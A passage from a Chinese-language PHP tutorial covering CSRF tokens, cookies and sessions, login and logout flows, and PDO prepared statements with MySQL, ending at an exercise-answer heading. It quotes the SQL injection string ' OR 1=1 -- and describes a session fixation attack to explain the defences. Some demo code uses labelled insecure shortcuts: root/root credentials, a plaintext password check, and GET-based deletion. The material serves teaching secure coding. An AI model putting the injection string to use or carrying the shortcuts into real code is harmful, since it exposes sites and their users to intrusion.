如果用户**已登录你的站**（浏览器自动带 Cookie，第 8 章），访问 A 的页面就"顺带"触发了对你站的操作——**跨站请求伪造（CSRF）**。防御基本功：表单里塞一个**会话级随机令牌**，服务端核对：

```php
<?php
session_start();                                        // 第 8 章正式讲
if (empty($_SESSION["csrf"])) {
    $_SESSION["csrf"] = bin2hex(random_bytes(16));      // 生成一次性令牌
}
?>
<form method="post" action="submit.php">
    <input type="hidden" name="csrf" value="<?= $_SESSION["csrf"] ?>">
    ...
</form>
```

```php
<?php
// submit.php
session_start();
if (!hash_equals($_SESSION["csrf"] ?? "", $_POST["csrf"] ?? "")) {
    http_response_code(403);
    exit("非法请求来源");
}
```

令牌存在 Session（只有你的站知道）、攻击者伪造不出——请求没带对令牌直接 403。本章只立概念，第 10 章安全专题全面收编（含 SameSite Cookie 属性的补充防御）。

### HTML 表单元素全家桶（配对超全局）

把常用表单控件与 PHP 读取方式一次性对齐（写表单的查表手册）：

```php
<?php if ($_SERVER["REQUEST_METHOD"] === "POST") {
    var_dump($_POST);          // 所有控件的落点都在这里，先 dump 看结构再写业务
} ?>
<form method="post">
    文本：<input name="text"><br>
    密码：<input type="password" name="pwd"><br>
    多行：<textarea name="bio"></textarea><br>
    单选（同名一组）：
    <input type="radio" name="gender" value="m">男
    <input type="radio" name="gender" value="f">女<br>
    复选（同名加 [] 收成数组！）：
    <input type="checkbox" name="langs[]" value="php">PHP
    <input type="checkbox" name="langs[]" value="js">JS<br>
    下拉：<select name="city"><option value="bj">北京</option></select><br>
    隐藏：<input type="hidden" name="csrf" value="..."><br>
    <button name="action" value="save">保存</button>
    <button name="action" value="draft">存草稿</button>
</form>
```

```php
// 对应的读取形态
$_POST["text"];            // string（没填是 ""？不——是 Undefined key！一律 ?? ""）
$_POST["langs"];           // 勾选了的 value 数组：["php", "js"]（全没勾 = 键不存在！）
$_POST["action"];          // 被点的那颗按钮的 value（区分两个提交按钮的技巧）
```

三件易错事：**① 复选框加 `[]`**（否则同名覆盖只剩最后一个）；**② 没勾选 = 键不存在**（不是空数组，`$_POST["langs"] ?? []` 兜底）；**③ 多按钮表单**用 button 的 name/value 判断用户点了哪个。表单写到哪份都要 `var_dump($_POST)` 先看真容——**眼见为实，不猜结构**。

## 7.6 小结

- GET 查询 / POST 提交；超全局的值 = 敌人：`??` + 强转 + trim；
- 验证四步（必填/长度/形状/业务）服务端最后防线；422 报错列表；
- **PRG 模式**防重复提交；header() 必须在任何输出之前；
- CSRF 令牌 = 表单隐藏字段 + Session 存储 + hash_equals 核对；
- htmlspecialchars 是输出转义反射（第 10 章展开）。

## 练习 7

1.（概念）为什么表单必须 `method="post"` 而不是 get？GET 传密码的风险有哪些？
2.（编程）写 `search.php`：接收 `?keyword=`，在预置数组里查找包含关键词的项并渲染表格（输出记得转义）。
3.（编程）给 7.3 的验证加"敏感词过滤"：留言含"广告"二字直接拒绝（错误信息不带敏感词内容）。
4.（概念）PRG 为什么能防重复提交？直接 echo 结果页会发生什么？
5.（编程）给留言表单加上 CSRF 令牌（完整两个文件）。

## 参考答案

**1.** POST 数据在请求体，语义是"提交变更"；GET 参数在 URL——会被浏览器历史、服务器 access.log、Referer 头记录，传密码等于广播。

**2.**

```php
<?php
$all = [["张三","php 学习中"], ["李四","打球"], ["王五","php 真香"]];
$kw = trim($_GET["keyword"] ?? "");
?>
<table border="1">
<?php foreach ($all as [$n, $c]): if ($kw !== "" && str_contains($c, $kw)): ?>
    <tr><td><?= htmlspecialchars($n) ?></td><td><?= htmlspecialchars($c) ?></td></tr>
<?php endif; endforeach; ?>
</table>
```

**3.** 验证函数里加：

```php
if (str_contains($content, "广告")) {
    $errors[] = "内容包含不允许的词汇";
}
```

**4.** 提交后若直接渲染结果页，用户刷新 = 浏览器重放上一次 POST（提示"重新提交表单"），数据重复入库。PRG 让刷新落在 GET 结果页，无副作用。

**5.** form.php 里 `session_start()` + 生成令牌 + 隐藏字段；submit.php 里 `session_start()` + `hash_equals` 核对，不一致 403 退出。（完整代码见 7.5 节原文拼接。）

**[▲ 返回目录](#toc)**

---

<a id="h08"></a>

# 第 8 章 Session 与 Cookie

> 本章目标：理解 HTTP 无状态与"伪造状态"的两大手段（Cookie 在客户端、Session 在服务端）；完成登录/登出实战；掌握会话安全要点。这是动态网站"认出你是谁"的全部机制。

---

## 8.1 问题：HTTP 是失忆的

HTTP 协议**天生无状态**：每个请求独立，服务器处理完就忘——刚才登录的是你，下一个请求服务器完全不认识（对照第 1 章"请求即生命"）。要让网站"记住"用户（登录态、购物车），必须**人为制造状态**，手段有两种：

```
Cookie：服务器发一块小数据，浏览器存在客户端，之后每次请求自动带上
         → 数据在客户端（用户可见可改——只能放不敏感的东西）

Session：服务器发一把"钥匙"（随机 ID），存在客户端 Cookie；
         真正的数据（登录状态等）存在服务端，凭 ID 找回
         → 敏感数据在服务端（客户端只有一把猜不出来的钥匙）
```

**现代规范：认证等敏感状态一律用 Session；Cookie 只放非敏感偏好**（语言、主题）。全部用 Cookie 存登录信息是老时代遗毒——用户改个 Cookie 就成了管理员（第 10 章反面教材）。

## 8.2 Cookie 操作

```php
<?php
// 设置 Cookie（必须在任何输出之前——它是响应头）
setcookie("theme", "dark", [
    "expires"  => time() + 86400 * 7,      // 7 天有效
    "path"     => "/",                     // 全站有效
    "secure"   => true,                    // 仅 HTTPS 传输
    "httponly" => true,                    // JS 读不到（防 XSS 偷 Cookie）
    "samesite" => "Lax",                   // 跨站限制（防 CSRF 的一部分）
]);

echo $_COOKIE["theme"] ?? "默认主题";       // 读：下一次请求起才能读到
setcookie("theme", "", expires: time() - 3600);   // 删除：让浏览器过期它
```

五项参数都是安全相关：`secure`（只走加密通道）、`httponly`（防脚本窃取）、`samesite`（跨站请求不带它，CSRF 第二道防线）——**写 Cookie 必带这三件**，第 10 章解释攻击原理。

## 8.3 Session：服务端的状态仓库

```php
<?php
session_start();                       // 开启/恢复会话（每个要用会话的页面开头都要调）
                                       // 内部动作：读 Cookie 里的 PHPSESSID → 加载对应数据

$_SESSION["user_id"] = 42;             // 存：像操作普通数组一样
$_SESSION["cart"] = ["苹果", "香蕉"];

echo $_SESSION["user_id"];             // 取
isset($_SESSION["user_id"]);           // 判存在
unset($_SESSION["cart"]);              // 删单项
session_destroy();                     // 销毁整个会话（登出用）
```

`session_start()` 幕后三步：① 看请求 Cookie 里的 `PHPSESSID`；② 没有 → 生成随机 ID 并准备 Set-Cookie 响应头；③ 有 → 从服务端存储（默认文件）载入该 ID 对应的 `$_SESSION` 数组。**`$_SESSION` 的数据从来不在浏览器里**，浏览器只有那串 ID。

运行验证：写两个文件 `a.php`（`session_start(); $_SESSION["name"]="张三";`）和 `b.php`（`session_start(); echo $_SESSION["name"] ?? "不认识你";`）——先访问 a 再访问 b，输出"张三"；清掉浏览器 Cookie 再访问 b，变"不认识你"。**这就是"状态"的全部魔法。**

### Session 配置与会话安全清单

php.ini（或 `session_start()` 前用 `ini_set`）里与安全相关的会话参数，一次配齐：

```php
// PHP 8+ 推荐：session_start 前用函数式配置
session_set_cookie_params([
    "lifetime" => 0,                 // 0 = 浏览器关闭即失效（登录态常用）
    "path"     => "/",
    "secure"   => true,              // 仅 HTTPS
    "httponly" => true,              // JS 不可读
    "samesite" => "Lax",
]);
session_name("MYSESSID");            // 别用默认 PHPSESSID（少暴露技术栈）
session_start();
```

配套的治理参数（了解即可，默认够用）：`session.gc_maxlifetime = 1440`（服务端会话数据 24 分钟后可回收——"超时"的底层机制）、`session.save_path`（会话文件目录，大流量换 Redis 存储）。**会话安全清单**（对照第 10 章纵深表）：登录成功 regenerate_id；Cookie 三件套；登出 destroy + 过期 Cookie；敏感操作前二次验证密码；跨会话持久化凭证（"记住我"）单独管理可撤销。

### 实战：Session 版购物车

无状态模型下"购物车"是状态保持的经典习题——把商品列表存进 `$_SESSION`：

```php
<?php
session_start();

// 加购：?add=sku123
if (isset($_GET["add"])) {
    $sku = $_GET["add"];
    $_SESSION["cart"][$sku] = ($_SESSION["cart"][$sku] ?? 0) + 1;    // 数量累加
    header("Location: cart.php");       // PRG：防刷新重复加购
    exit;
}

// 移除
if (isset($_GET["del"])) {
    unset($_SESSION["cart"][$_GET["del"]]);
    header("Location: cart.php");
    exit;
}

$cart = $_SESSION["cart"] ?? [];
?>
<p>购物车（<?= array_sum($cart) ?> 件）：</p>
<ul>
<?php foreach ($cart as $sku => $qty): ?>
    <li><?= htmlspecialchars($sku) ?> × <?= $qty ?>
        <a href="?del=<?= urlencode($sku) ?>">移除</a></li>
<?php endforeach; ?>
</ul>
<p><a href="?add=apple">加购苹果</a> | <a href="?add=pen">加购笔</a></p>
```

三处设计值得咀嚼：**加购后 PRG**（刷新不重复加购——GET 写操作在教学场景的宽限 + PRG 兜底，严格生产版改 POST）、`?? 0` 累加、URL 参数 `urlencode`（把中文/特殊字符编码成合法 URL）。关掉浏览器再开，购物车还在（Cookie 会话级 + 服务端存储），换台电脑就没了（数据在服务端按 ID 隔离）——**Session 语义的完美教学案例**。

## 8.4 登录实战：login.php / guard.php / logout.php

三个文件组成最小认证体系（数据库验证在第 9 章接入，本例硬编码演示流程）：

```php
<?php
// login.php —— 登录页 + 处理
session_start();

$users = [                                          // 演示用硬编码；第 9 章换数据库
    "admin" => "password_hash_样例见第10章",          // 真实密码绝不明文，见第 10 章
];

$error = "";
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $user = trim($_POST["user"] ?? "");
    $pass = $_POST["pass"] ?? "";

    // 演示用明文比对；生产必须 password_verify + 哈希（第 10 章）
    if (isset($users[$user]) && $pass === "secret123") {
        session_regenerate_id(true);                // ① 登录成功换新会话 ID（防会话固定攻击）
        $_SESSION["user_id"] = $user;
        $_SESSION["logged_in_at"] = time();
        header("Location: index.php");              // ② PRG
        exit;
    }
    $error = "用户名或密码错误";
}
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>登录</title></head><body>
    <?php if ($error): ?><p style="color:red"><?= htmlspecialchars($error) ?></p><?php endif; ?>
    <form method="post">
        <p>用户名：<input name="user" required></p>
        <p>密码：<input type="password" name="pass" required></p>
        <p><button>登录</button></p>
    </form>
</body></html>
```

```php
<?php
// guard.php —— 页面守卫（被需要登录的页面 include）
session_start();

if (empty($_SESSION["user_id"])) {
    header("Location: login.php");
    exit;
}
// 过了这关，后面的代码安全地认为"已登录"
```

```php
<?php
// index.php —— 受保护页面
require "guard.php";
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"></head><body>
    <h1>你好，<?= htmlspecialchars($_SESSION["user_id"]) ?></h1>
    <a href="logout.php">登出</a>
</body></html>
```

```php
<?php
// logout.php
session_start();
$_SESSION = [];                       // 清空会话数据
session_destroy();                    // 销毁服务端会话
setcookie("PHPSESSID", "", expires: time() - 3600);   // 顺手让客户端钥匙过期
header("Location: login.php");
exit;
```

流程自测：未登录访问 index.php → 被踢去 login.php → 登录 → 回 index.php 显示用户名 → 登出 → 再访问又被踢。**这套 redirect 守卫模式就是一切认证系统的骨架**（Laravel 的中间件、FastAPI 的 Depends 都是它的框架化）。

### 登录限速与会话固定攻防演示

**登录限速**（防爆破）：失败次数存 Session/缓存，超限锁定一段时间：

```php
<?php
session_start();
$fails = $_SESSION["login_fails"] ?? 0;
$lastFail = $_SESSION["last_fail"] ?? 0;

if ($fails >= 5 && time() - $lastFail < 300) {          // 5 次失败后锁 5 分钟
    exit("尝试过多，请 " . (300 - (time() - $lastFail)) . " 秒后再试");
}

// ...验证逻辑...
if (登录失败) {
    $_SESSION["login_fails"] = $fails + 1;
    $_SESSION["last_fail"] = time();
    exit("用户名或密码错误");                            // 不指明哪个错（防枚举）
}

$_SESSION["login_fails"] = 0;                           // 成功清零
```

生产级会换全局存储（数据库/Redis）——Session 版只防"这一个浏览器"，攻击者清 Cookie 重来就能绕过；**但加上它的成本几乎为零，防君子顺手防脚本小子**。真·爆破防护三件套：限速 + 验证码（阈值触发）+ 失败通知。

**会话固定攻击**（第 8 章埋的雷）演示理解：攻击者先到站点领一个会话 ID `abc123`，构造链接 `login.php?PHPSESSID=abc123`（或改 Cookie）诱导你用它登录；你登录成功后，会话 `abc123` 就是"已登录"状态——**攻击者手里有同一个 ID**，直接接管你的会话。`session_regenerate_id(true)` 在登录瞬间换新 ID，攻击者手里的旧 ID 立刻作废——**一行代码拆掉整条攻击链**，这就是它在 8.4 出现的理由。

### "记住我"的正确姿势

勾选"记住我"不能简单延长会话（会话 ID 长期不变 = 劫持窗口拉长）。工业级方案 **Remember-Me Token**：

```php
// 登录成功且勾选时：
$token = bin2hex(random_bytes(32));
$GLOBALS["pdo"]->prepare("UPDATE users SET remember_token = :t WHERE id = :id")
    ->execute(["t" => hash("sha256", $token), "id" => $user["id"]]);   // 库里存哈希
setcookie("remember", $token, [
    "expires" => time() + 86400 * 30, "secure" => true,
    "httponly" => true, "samesite" => "Lax",
]);

// 下次访问（Session 失效后）：guard 检测无会话但有 remember Cookie
// → 按 hash(token) 查库 → 有效则恢复登录（并轮换新 token）
```

要点：库里存 **token 的哈希**（库泄露时令牌不可逆用）、token 随机 256 位（不可猜）、每次自动登录**轮换**新 token（旧 token 用一次作废，重放即暴露）。Laravel 的 `remember_me` 就是这套机制的框架化——**第 8 章"记住我"练习（简单版）到这里升级为工业版**。

## 8.5 会话安全四原则

| 原则          | 做法                                   | 防什么                                 |
| ------------- | -------------------------------------- | -------------------------------------- |
| 登录后换 ID   | `session_regenerate_id(true)`          | 会话固定（攻击者预设 Cookie 借你登录） |
| Cookie 三件套 | secure + httponly + samesite           | 偷 Cookie、CSRF                        |
| 超时管理      | 存 `logged_in_at`，超过 N 分钟强制重登 | 离座后被冒用                           |
| 服务端存状态  | Session 只放 ID                        | 客户端篡改权限                         |

超时示例（guard.php 里加两行）：

```php
if (time() - ($_SESSION["logged_in_at"] ?? 0) > 1800) {     // 30 分钟
    session_unset();
    session_destroy();
    header("Location: login.php?expired=1");
    exit;
}
```

第 10 章会把"密码怎么存"（password_hash/verify）与"Session 劫持怎么防"讲透，本章的骨架届时直接复用。

## 8.6 小结

- HTTP 无状态；Cookie = 客户端小票（不敏感偏好），Session = 服务端仓库 + 客户端钥匙（敏感状态）；
- session_start() 每页必调；`$_SESSION` 数组读写；destroy 登出；
- 登录三件套：login（验证 + regenerate + PRG）、guard（include 守卫）、logout（清 + 毁 + 过期 Cookie）；
- Cookie 必带 secure/httponly/samesite 三件套；登录成功必换会话 ID；
- 客户端只有 ID，数据永远在服务端。

## 练习 8

1.（概念）为什么登录状态不放 Cookie（哪怕加密）？Session 方案里客户端存的是什么？
2.（编程）给 8.4 加"记住我"复选框：勾选则会话有效期延长到 7 天（提示：session_set_cookie_params 或手动 setcookie(PHPSESSID...)）。
3.（编程）guard.php 加"登录超时 30 分钟"逻辑。
4.（概念）`session_regenerate_id(true)` 为什么要在登录成功时调用？不调会发生什么？
5.（编程）访问计数器：用 Session 记录某用户在本站刷新了多少次页面，页面显示次数。

## 参考答案

**1.** Cookie 在用户手里：明文/弱加密都会被改（时间戳+签名可伪造的历史事故很多），客户端数据不可信任。Session 方案客户端只存**随机会话 ID**（PHPSESSID），猜不出也改不动——改了只是变成另一个（未登录的）会话。

**2.**

```php
// login.php 验证成功后、session_start() 之前：
$days = isset($_POST["remember"]) ? 7 : 0;
if ($days > 0) {
    session_set_cookie_params(["lifetime" => $days * 86400, "secure" => true,
                               "httponly" => true, "samesite" => "Lax"]);
}
session_start();
```

**3.** 见 8.5 节超时示例（比较 `$_SESSION["logged_in_at"]` 与当前时间差）。

**4.** 若不换 ID，攻击者可先从站点领一个会话 ID（或伪造），引诱受害者用该 ID 登录——登录后权限就"挂"在攻击者已知的 ID 上（会话固定攻击）。regenerate 换新 ID 让旧 ID 作废。

**5.**

```php
<?php
session_start();
$_SESSION["views"] = ($_SESSION["views"] ?? 0) + 1;
echo "你已访问本页 {$_SESSION["views"]} 次";
```

**[▲ 返回目录](#toc)**

---

<a id="h09"></a>

# 第 9 章 MySQL 与 PDO

> 本章目标：建库建表（phpStudy 自带 MySQL）；用 PDO 扩展连接数据库；**预处理语句**（防 SQL 注入的唯一正解）；CRUD 四件套。这是"进"通道的下一站——数据的永久家。

---

## 9.1 MySQL 准备

phpStudy 用户：面板启动 MySQL → 打开自带 phpMyAdmin 或用命令行客户端。创建练习库：

```sql
CREATE DATABASE demo CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE demo;

CREATE TABLE students (
    id       INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    name     VARCHAR(32) NOT NULL,
    score    INT NOT NULL DEFAULT 0,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO students (name, score) VALUES
    ("张三", 90), ("李四", 66), ("王五", 95), ("赵六", 45);
```

要点：`utf8mb4`（完整 Unicode，能存 emoji——老 `utf8` 是残血版）；`AUTO_INCREMENT` 自增主键；`NOT NULL DEFAULT` 约束兜底。命令行客户端（phpStudy 的 `Extensions\MySQL\bin\mysql.exe`）：`mysql -u root -p` 回车输密码（phpStudy 默认 root/root）。

## 9.2 PDO：统一的数据库接口

PHP 官方的数据库扩展：`mysqli`（仅 MySQL）与 **PDO**（PHP Data Objects，支持 MySQL/PostgreSQL/SQLite 等十余种，**接口统一**）。现代规范用 PDO——换数据库几乎不用改代码（对标 Java 的 JDBC）。

```php
<?php
// db.php —— 连接工厂（第 6 章 Composer 项目里放 src/Db.php）
$pdo = new PDO(
    "mysql:host=127.0.0.1;port=3306;dbname=demo;charset=utf8mb4",
    "root",
    "root",
    [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,   // 出错抛异常（必须！）
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,         // 取行默认关联数组
        PDO::ATTR_EMULATE_PREPARES   => false,                    // 真预处理（安全+正确）
    ]
);
```

`ERRMODE_EXCEPTION` 三件套第一件：不设置的话查询失败**静默返回 false**——"查不到数据"和"SQL 写错"混在一起，是 PHP 老项目排障噩梦的头号来源。密码等敏感信息最终会挪进 `.env`（第 6 章 vlucas/phpdotenv），教学先内联。

## 9.3 查询：query 与 预处理 prepare

**没有参数的查询**可以直接 query：

```php
$rows = $pdo->query("SELECT id, name, score FROM students ORDER BY score DESC")->fetchAll();

foreach ($rows as $row) {
    echo "{$row["id"]}  {$row["name"]}  {$row["score"]}\n";    // FETCH_ASSOC：$row["name"]
}
```

**带参数的查询必须用预处理**（prepared statement）——SQL 与数据分开发送，数据永远不被当成 SQL 解释：

```php
<?php
// 按名字查（名字来自用户输入！）
$stmt = $pdo->prepare("SELECT * FROM students WHERE name = :name");
$stmt->execute(["name" => $_GET["q"] ?? ""]);        // 数据走“通道”，不参与 SQL 解析
$row = $stmt->fetch();                               // 单行（无数据返回 false）
```

```php
// 命名参数 ：name / 问号占位两种写法
$stmt = $pdo->prepare("SELECT * FROM students WHERE score >= ? AND score <= ?");
$stmt->execute([60, 90]);                            // 问号按顺序对号
```

**为什么这是防 SQL 注入的唯一正解**（第 10 章展开攻击原理）：注入 = 用户输入被拼进 SQL 字符串后被当作 SQL 执行；预处理把 SQL 结构和数据**分两次**送达服务器，数据的任何内容（包括 `' OR 1=1 --`）都只是"数据"，永远成不了 SQL。**守则绝对化：只要 SQL 里有变量，就必须 prepare/execute，没有例外**——字符串拼接 SQL 的写法一律视为事故。

## 9.4 增删改：exec 与 lastInsertId

```php
<?php
// INSERT（预处理同样必须）
$stmt = $pdo->prepare("INSERT INTO students (name, score) VALUES (:name, :score)");
$stmt->execute(["name" => "新同学", "score" => 88]);
$id = $pdo->lastInsertId();               // 自增主键的值（后续跳转/关联要用）

// UPDATE：别忘了 WHERE！（没有 WHERE = 全表遭殃，经典事故）
$stmt = $pdo->prepare("UPDATE students SET score = :score WHERE id = :id");
$stmt->execute(["score" => 99, "id" => $id]);
echo $stmt->rowCount();                   // 受影响的行数（0 = 没改到，常用于判存在）

// DELETE 同款
$stmt = $pdo->prepare("DELETE FROM students WHERE id = :id");
$stmt->execute(["id" => 4]);
```

## 9.5 实战整合：成绩管理页（查 + 渲染 + 删）

把第 7 章表单、第 3 章模板、本章 PDO 串成一个真页面：

```php
<?php
// manage.php —— 成绩列表 + 添加 + 删除
$pdo = new PDO("mysql:host=127.0.0.1;dbname=demo;charset=utf8mb4", "root", "root", [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
]);

$errors = [];

if ($_SERVER["REQUEST_METHOD"] === "POST") {            // 添加处理（PRG）
    $name = trim($_POST["name"] ?? "");
    $score = (int)($_POST["score"] ?? -1);

    if ($name === "" || $score < 0 || $score > 100) {
        $errors[] = "姓名必填，成绩需在 0~100";
    } else {
        $pdo->prepare("INSERT INTO students (name, score) VALUES (:n, :s)")
            ->execute(["n" => $name, "s" => $score]);
        header("Location: manage.php");                  // PRG 防重复提交
        exit;
    }
}

if (isset($_GET["del"])) {                               // 删除（GET 简化教学；生产用 POST+CSRF）
    $pdo->prepare("DELETE FROM students WHERE id = :id")
        ->execute(["id" => (int)$_GET["del"]]);
    header("Location: manage.php");
    exit;
}

$rows = $pdo->query("SELECT * FROM students ORDER BY score DESC")->fetchAll();
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>成绩管理</title></head><body>
    <h1>成绩管理</h1>
    <?php foreach ($errors as $e): ?>
        <p style="color:red"><?= htmlspecialchars($e) ?></p>
    <?php endforeach; ?>

    <form method="post">
        <input name="name" placeholder="姓名" required>
        <input name="score" type="number" min="0" max="100" placeholder="成绩" required>
        <button>添加</button>
    </form>

    <table border="1" cellpadding="4">
        <tr><th>id</th><th>姓名</th><th>成绩</th><th>操作</th></tr>
        <?php foreach ($rows as $r): ?>
        <tr>
            <td><?= $r["id"] ?></td>
            <td><?= htmlspecialchars($r["name"]) ?></td>
            <td><?= $r["score"] ?></td>
            <td><a href="?del=<?= $r["id"] ?>"
                  onclick="return confirm('确定删除？')">删除</a></td>
        </tr>
        <?php endforeach; ?>
    </table>
</body></html>
```

这一个文件里：PDO 预处理、验证、PRG、转义输出、模板循环——**前 7 章的知识全部落地**。注意"删除"用 GET 链接是教学简化（违背"写操作用 POST"，第 10 章 CSRF 一节会连它一起修）。

### 多表查询：JOIN 与分页

数据一关系化就离不开 JOIN（多表连查）。先造关系：messages 表关联 users（第 11 章用了它，这里正式学）：

```sql
-- 内连接：只取两边都匹配的行（留言 + 作者名）
SELECT m.id, m.content, u.username, m.created_at
FROM messages m                          -- 表别名（长表名的福音）
JOIN users u ON u.id = m.user_id
ORDER BY m.id DESC
LIMIT 10 OFFSET 0;                       -- LIMIT 取几条 OFFSET 跳过几条
```

```php
<?php
// PHP 侧：分页参数 → LIMIT/OFFSET（预处理占位）
$page   = max(1, (int)($_GET["page"] ?? 1));
$perPage = 10;
$offset = ($page - 1) * $perPage;

$stmt = $pdo->prepare(
    "SELECT m.*, u.username FROM messages m
     JOIN users u ON u.id = m.user_id
     ORDER BY m.id DESC LIMIT :limit OFFSET :offset"
);
$stmt->execute(["limit" => $perPage, "offset" => $offset]);
$rows = $stmt->fetchAll();

// 总数（算总页数用）
$total = (int)$pdo->query("SELECT COUNT(*) FROM messages")->fetchColumn();
$totalPages = (int)ceil($total / $perPage);
```

JOIN 三兄弟一句话分辨：`INNER JOIN`（两边都匹配才要）、`LEFT JOIN`（左表全保留，右边没有就 NULL——"没有头像的用户也要显示"用它）、`CROSS JOIN`（笛卡尔积，慎用）。**性能地基——索引**：`WHERE/JOIN/ORDER BY` 涉及的列建索引（`CREATE INDEX idx_user ON messages(user_id)`），量级上万后有无索引是毫秒与秒的差别（对照 Java 教程的数据库索引话题，原理同款：B+ 树直达）。

### SELECT 进阶四式

```sql
-- ① 聚合：统计（COUNT/SUM/AVG/MAX/MIN）
SELECT COUNT(*) AS total, AVG(score) AS avg FROM students;

-- ② GROUP BY：分组聚合（每班的平均分）+ HAVING 过滤聚合结果
SELECT class_id, AVG(score) AS avg_score
FROM students
GROUP BY class_id
HAVING avg_score >= 60;

-- ③ 模糊匹配：LIKE（% 任意串 _ 单字符）——注意 LIKE 的参数也要走预处理
SELECT * FROM students WHERE name LIKE '张%';

-- ④ IN 与排序多键
SELECT * FROM students WHERE id IN (1, 5, 9)
ORDER BY score DESC, name ASC;
```

SQL 是与 PHP 并列的第二语言——本书只覆盖 CRUD+JOIN+聚合的地基（够留言板与中小项目），深入（子查询、索引调优、事务隔离级别）推荐《SQL 必知必会》薄薄一本补全。**用 PHP 写 SQL 的纪律永远不变：结构拼定稿、数据走参数**。

## 9.6 事务：要么全成、要么全不

转账类"多步必须同时成功"的操作用事务（第 8 章 Session 是"会话"，事务是"原子操作"，别混）：

```php
<?php
$pdo->beginTransaction();
try {
    $pdo->prepare("UPDATE accounts SET balance = balance - :a WHERE id = :from")
        ->execute(["a" => 100, "from" => 1]);
    $pdo->prepare("UPDATE accounts SET balance = balance + :a WHERE id = :to")
        ->execute(["a" => 100, "to" => 2]);
    $pdo->commit();                       // 两条都成功 → 真正生效
} catch (Throwable $e) {
    $pdo->rollBack();                     // 任何一条失败 → 全部回滚，账目一致
    throw $e;
}
```

InnoDB 引擎支持事务（phpStudy 默认即是）。判断标准一句话：**一次业务要写多张表/多行，就包事务**。

### 预处理进阶：bindValue 类型与 IN 子句技巧

**LIMIT/OFFSET 占位符必须显式绑整型**（9.5 章预埋，正式讲）：

```php
$stmt = $pdo->prepare("SELECT * FROM students LIMIT :n OFFSET :o");
$stmt->bindValue(":n", $perPage, PDO::PARAM_INT);    // execute([]) 数组方式会把 LIMIT 绑成字符串
$stmt->bindValue(":o", $offset, PDO::PARAM_INT);     // → 语法错或静默异常，必须 bindValue + PARAM_INT
$stmt->execute();
```

`execute([...])` 数组方式所有参数按字符串处理（多数场景 MySQL 自动转），但 LIMIT/OFFSET 这类"语法位置"的参数必须真整数——**规则：WHERE 值用 execute 数组；LIMIT/OFFSET 用 bindValue+PARAM_INT**。

**IN 子句**的占位符不能直接放数组（一个 `:ids` 塞 `[1,5,9]` 不行），经典解法——动态生成等量占位符：

```php
$ids = [1, 5, 9];
$ph = implode(",", array_fill(0, count($ids), "?"));    // "?,?,?"
$stmt = $pdo->prepare("SELECT * FROM students WHERE id IN ($ph)");
$stmt->execute($ids);                                    // 按顺序喂三个问号
```

占位符数量与参数个数自动对齐，注入依然无门（占位符本身是结构的一部分）。封装成 `whereIn()` 助手函数后一劳永逸——框架查询构造器的 `whereIn` 就是这十行的工业化版本。

### 数据库设计入门：外键与范式一瞥

留言板的两表关系再深一层——**为什么用 user_id 关联而不在 messages 里存 username？**

```sql
-- 正确：存"谁"的编号（外键），名字变了留言不受影响
ALTER TABLE messages
  ADD CONSTRAINT fk_msg_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;
-- ON DELETE CASCADE：用户被删时他的留言自动删除（级联）；不加则插入被拒（RESTRICT 默认）
```

- 外键 = 数据库层面保证"引用一定存在"（应用层 bug 也破坏不了关系）；
- **范式直觉**：每类事实只存一份（用户名在 users 一处，messages 只存引用）——更新用户名一处改动全站生效，这就是"不冗余"的红利（对照第 11 章"浅拷贝共享内存"的哲学：一份事实，多方引用）；
- 适度反范式：列表页高频显示作者名，JOIN 每次都连表太贵——生产会加"冗余 author_name 列"（写入时同步），**规范与性能的权衡是数据库设计的永恒主题**，入门先守范式，量大了再反。

### phpMyAdmin 与备份恢复

**phpMyAdmin**（phpStudy 面板一键打开的 Web 管理工具）：建库建表、浏览数据、导入导出 SQL——图形界面干 SQL 的活。上手要点：左侧选库 → 顶部 SQL 标签跑语句 → Export 导出（选 SQL 格式）。它是 MySQL 的"文件管理器"，命令行 mysql.exe 是"命令行"——两者都要会一点，phpMyAdmin 快速验证、命令行批量执行。

**备份与恢复**（mysqldump 一招鲜）：

```
# 备份（导出完整建表+数据 SQL）
mysqldump -u root -p demo > demo_backup_20261117.sql

# 恢复（把 SQL 重新灌回）
mysql -u root -p demo < demo_backup_20261117.sql

# 定时备份（Windows 任务计划 / Linux crontab，每天凌晨）
mysqldump -u root -p密码 demo | gzip > /backup/demo_$(date +%F).sql.gz
```

备份的检验标准：**拿恢复出来的库跑一遍应用**（没恢复过的备份等于没有备份）。生产数据库另配主从复制/云数据库自动备份——入门期的"每天 mysqldump + 异地拷贝一份"已经超过大部分真实小项目。

**Drop 前想三秒**守则（对照 C 教程"用 w 模式前想三秒"）：写 DELETE/UPDATE/DROP 前，先在 phpMyAdmin 用 SELECT 预览影响范围（同样的 WHERE 条件），确认行数符合预期再动手——**先 SELECT 后 DELETE** 是数据库操作的第一安全反射。

## 9.7 小结

- utf8mb4 建库；PDO 三件套（ERRMODE_EXCEPTION / FETCH_ASSOC / EMULATE_PREPARES=false）；
- **带参数必 prepare/execute**——数据走通道不进 SQL；命名参数与问号两式；
- lastInsertId / rowCount / fetchAll / fetch；CRUD 四件套；
- PRG + 验证 + 转义在本章合体；多步写库包事务。

## 练习 9

1.（概念）预处理语句为什么能防 SQL 注入？用一句话解释"数据与结构分离"。
2.（操作）创建 `messages` 表（id, author VARCHAR(32), content VARCHAR(500), created_at），手动插入两条数据。
3.（编程）写 `search.php`：按关键字模糊查询 students（`LIKE :kw`，绑定 `"%$kw%"`），渲染结果表（转义输出）。
4.（编程）给 9.5 页面加"平均分统计"行（一条 SQL 的 AVG 或 PHP 端计算均可）。
5.（概念）`header("Location: ...")` 前不能有什么？为什么 9.5 的添加分支最后要 exit？

## 参考答案

